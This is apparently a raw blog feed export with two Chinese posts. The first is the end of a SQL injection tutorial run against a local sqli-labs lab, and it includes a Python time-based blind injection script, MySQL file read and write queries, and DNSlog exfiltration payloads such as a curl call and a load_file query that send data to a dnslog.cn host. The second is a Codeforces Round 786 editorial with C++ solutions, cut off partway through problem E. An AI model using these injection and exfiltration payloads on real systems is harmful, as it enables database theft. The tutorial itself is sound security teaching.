information_schema.schemata) and sleep(1)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    start=time.time()</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="comment">#print(time.time()-start)</span></span><br><span class="line">    <span class="comment">#quit()</span></span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">32</span></span><br><span class="line">    r=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata) and sleep(1);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        start=time.time()</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cost:&#x27;</span>+<span class="built_in">str</span>(time.time()-ss))</span><br></pre></td></tr></table></figure><p>跟布尔盲注差不多，就是在后面加上个 <code>sleep(1)</code> 就行了，我们也不用回显的结果去判断了，直接用经过的时间是否超过 <code>1S</code> 就好了。这里我们不仅统计了请求次数，我们还统计了花费时间。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/32.png" alt="31"></p><p>可以看到请求次数跟上面是一样的(小声：我偷偷改了ASCII的范围)。并且注出这94个字符我们花费了将近 <code>4min</code>，可以看到这个时间成本也是非常高的。</p><h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><p>基于时间的盲注基本适用于所有含有注入漏洞的页面，但是时间成本是最高的。</p><h4 id="DNSlog盲注"><a href="#DNSlog盲注" class="headerlink" title="DNSlog盲注"></a>DNSlog盲注</h4><p>以上两个盲注不管是哪个都需要频繁请求数据库才能获取到数据库的具体信息，在当代 <code>WAF</code> 防护如此严密的情况下，请求如此多很可能会导致 <code>ip</code> 被 <code>ban</code>，这里我们可以使用 <code>load_file</code> 来发起一个 <code>DNS</code> 请求。</p><h5 id="前置芝士：mysql读取文件"><a href="#前置芝士：mysql读取文件" class="headerlink" title="前置芝士：mysql读取文件"></a>前置芝士：mysql读取文件</h5><p>先介绍一个函数，之前读写文件的时候用过：<code>load_file(file)</code> 可以读取文件的内容。这里不仅可以读取本地的文件，还能向 <code>url</code> 发起请求。这里需要注意一下数据库的配置，数据库中有一个变量是 <code>secure_file_priv</code>，可以直接查看数据库的配置文件，或者是在 <code>mysql</code> 终端中直接使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p>来查看这一项配置。</p><ul><li>当 <code>secure_file_priv</code> 为空，就可以读取磁盘的目录。</li><li>当 <code>secure_file_priv</code> 为<code>G:\</code>，就可以读取G盘的文件。</li><li>当 <code>secure_file_priv</code> 为 <code>null</code>，<code>load_file</code> 就不能加载文件。</li></ul><p>所以为了方便，我们最好把 <code>my.ini</code> 文件的该项配置设置成：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这样我们就能任意读取，任意写文件了，但是在生产环境中慎重配置，因为比较危险。</p><p>读取文件的一般形式是 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file);</span><br></pre></td></tr></table></figure><p>比如我想读取 <code>D:</code> 目录下的 <code>1.txt</code> 文件，那就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;D:/1.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/33.png" alt="33"></p><p>可以发现读取结果以十六进制的方式输出出来了。</p><p>需要注意的是，文件名若以双反斜杠开头则代表向 <code>url</code> 发起请求。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/35.png" alt="35"></p><p>但是会发现这一请求比较耗时，</p><p>写文件的一般形式是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $information into outfile &quot;$file&quot;</span><br></pre></td></tr></table></figure><p>但是不能覆盖文件，只能创建文件。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/34.png" alt="34"></p><p>在一般情况下，读文件可以读取一些配置文件信息，泄露敏感内容</p><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>域名解析服务(Domain Name Server)，我们知道 <code>DNS</code> 的作用就是将我们熟知的域名转换成 <code>ip</code> 地址。</p><p>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。</p><p>比如谷歌的域名：<code>www.google.com</code><br>它由三个标号组成， <code>com</code> 即为顶级域名，<code>google</code> 为二级域名，<code>www</code> 即为三级域名,且域名不分区大小写。<br>比如我访问 <code>www.google.com</code> 发生了以下的事情：</p><ol><li>我请求我自己设置的域名服务器</li><li>域名服务器向知道此域名的服务器发起请求</li><li>域名服务器得到了 <code>www.google.com</code> 的 <code>ip</code> 地址，返回给我设置的服务器，最后返回给我。</li></ol><p>我们在域名服务器中就留下了这样一条记录：<code>x.x.x.x</code> 用户在什么时候解析了 <code>www.google.com</code> 的域名。</p><h5 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h5><p>DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名 <code>www.google.com</code> 等的访问信息，类似日志文件。</p><p>假如我在 <code>www.google.com</code> 之后还加了一个子域名，我的请求内容是 <code>xxx.www.google.com</code>，那么此时外部服务器并不知道谷歌在 <code>www</code> 域名下面还有一个子域名，那么它将域名请求发送给谷歌的服务器，谷歌服务器再解析出一个 <code>ip</code> 地址回去给域名服务器，当然也可能没有返回为空，不过这个请求还是会被谷歌的服务记录下来。这样我们的 <code>dns</code> 就会在网站的 <code>dns</code> 服务器留下信息了。</p><p>那么 <code>dnslog</code> 注入就是这么个原理了。它在你请求域名的时候，如果出现了分配给你 <code>dnslog</code> 服务器的日志，就会把数据返回给你。  </p><p>我们先来试试普通的 <code>dnslog</code> 带出信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl %USERNAME%.xxx.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/36.png" alt="36"></p><p>可以看到环境变量被执行带出到我们的 <code>dnslog</code> 服务器里面去了，<code>connection refused</code> 是因为他对所有的子域名解析的服务器地址都是 <code>127.0.0.1</code> 所以你本机没开 <code>web</code> 服务就会这样。</p><p>我们再来试试看在 <code>mysql</code> 里面泄露信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.dnslog.cn&#x27;));</span><br></pre></td></tr></table></figure><p>我们来试试去请求一下看看。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/37.png" alt="37"></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/38.png" alt="38"></p><p>可以发现成功泄露信息。</p><p>但是也要注意一下，每级域名长度最长为63，因此每次我们在请求的时候限制一下，用 <code>mid</code> 去截取就好了，虽然发起一次 <code>DNSlog</code> 请求要的时间也很多，但是比盲注要好一点。</p><p>域名若带有特殊字符会导致请求失败，因此在若泄露的信息有特殊符号注意编码一下，用 <code>hex</code> 去编码就好了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>sql</code> 注入也就学了这么多，暂时先写到这里吧，后续学了新的芝士再来补充。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sql学了也有一段时间了，想着把能用到的知识点都写一遍好。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="sql注入" scheme="http://example.com/categories/ctf/web/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 786(Div.3)</title>
    <link href="http://example.com/2022/05/03/Codeforces%20Round%20786(Div.3)/"/>
    <id>http://example.com/2022/05/03/Codeforces%20Round%20786(Div.3)/</id>
    <published>2022-05-03T04:00:00.000Z</published>
    <updated>2022-05-03T06:40:44.485Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1674">Codeforces Round #786 (Div. 3)</a>题解来了</p><p>实时录频在<a href="https://www.bilibili.com/video/BV18B4y117sn?spm_id_from=333.999.0.0">这里</a></p><span id="more"></span><h2 id="A-Number-Transformation"><a href="#A-Number-Transformation" class="headerlink" title="A. Number Transformation"></a>A. Number Transformation</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说让你找到两个数 $a,b$，使得 $x\times a^b=y$ 这里可以使得 $b=1$ 然后就判断一下 $y\ mod\ x=0$ 是否成立即可。 </p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">if</span>(y%x==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 %d\n&quot;</span>,y/x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0 0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dictionary"><a href="#B-Dictionary" class="headerlink" title="B. Dictionary"></a>B. Dictionary</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说输出一个字符串的字典序，字符串只有2个字符，然后两个字符应该不能一样，这样的话直接用公式就好了，如果能一样，这个公式应该是 $(a[0]-‘a’)\times 26+a[1]-‘a’$ 的，这里既然不能一样那就都减一就好了，但是要注意，如果 $a[1]$ 不超过 $a[0]$ 则不需要减一。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)*<span class="number">25</span>+(s[<span class="number">1</span>]-<span class="string">&#x27;a&#x27;</span>)-(s[<span class="number">1</span>]&gt;s[<span class="number">0</span>])+<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Infinite-Replacement"><a href="#C-Infinite-Replacement" class="headerlink" title="C. Infinite Replacement"></a>C. Infinite Replacement</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说一个字符串 $s$ 只包含 $a$，$a$ 可以用另一个字符串 $t$ 替代，问有多少种替换的结果，替换可以有无限次。</p><p>首先不难发现，如果 $t$ ==”$a$” 那么我替换是没有效果的，答案为 $1$。</p><p>其次如果 $t$ 不包含 “$a$”，那么对于 $s$ 的每个位置的 “$a$”，有替换和不替换两种选择，答案就是$2^{strlen(s)}$。</p><p>只剩下包含”$a$”的长度不为 $1$ 的字符串，可以发现允许进行无限次替换，直接 $-1$ 就好了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn],t[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,t);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span> &amp;&amp; t[<span class="number">0</span>]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t[i]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="number">1ll</span>&lt;&lt;<span class="built_in">strlen</span>(s));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-A-B-C-Sort"><a href="#D-A-B-C-Sort" class="headerlink" title="D. A-B-C Sort"></a>D. A-B-C Sort</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>过程是这样的：</p><p><strong>a-&gt;b</strong><br>选择最后一个元素放在ｂ数组的中间<br><strong>b-&gt;c</strong><br>选择中间元素放在c数组的后面</p><p>相当于这样：<br>按一定顺序将元素压入两个栈中，然后分别弹出观察是否能递增。<br>如果序列长度为偶数，则1,2元素均小于3，4元素，3，4元素均小于5，6元素……<br>如果为奇数，则1元素需要最小，2,3需要小于,4,5……<br>模拟一下就ok</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,x,y;</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[++cnt]=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=cnt;i&lt;n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">        <span class="keyword">if</span>(x&gt;y)&#123;</span><br><span class="line">            a[++cnt]=y;</span><br><span class="line">            a[++cnt]=x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[++cnt]=x;</span><br><span class="line">            a[++cnt]=y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i+<span class="number">1</span>]&lt;a[i])NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Breaking-the-Wall"><a href="#E-Breaking-the-Wall" class="headerlink" title="E. Breaking the Wall"></a>E. Breaking the Wall</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/5.png" alt="5"></p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题被杀疯了，结束的时候 $3000AC$ 到现在就剩下 $200$ 